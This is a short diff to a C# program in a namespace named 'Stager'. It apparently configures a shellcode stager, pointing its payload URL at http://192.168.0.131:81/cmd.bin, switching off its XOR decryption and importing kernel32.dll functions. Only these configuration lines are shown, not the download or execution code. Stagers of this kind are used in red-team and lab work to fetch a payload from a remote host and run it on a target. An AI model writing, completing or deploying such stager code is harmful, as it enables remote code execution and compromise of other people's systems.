@@ -6,8 +6,8 @@ namespace Stager
 {
     internal class Program
     {
-        private static string url = "http://localhost/03mzew4d.tmf";
-        private static string decryption = "xor";
+        private static string url = "http://192.168.0.131:81/cmd.bin";
+        private static string decryption = "";
         private static char key = 'k';
 
         [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
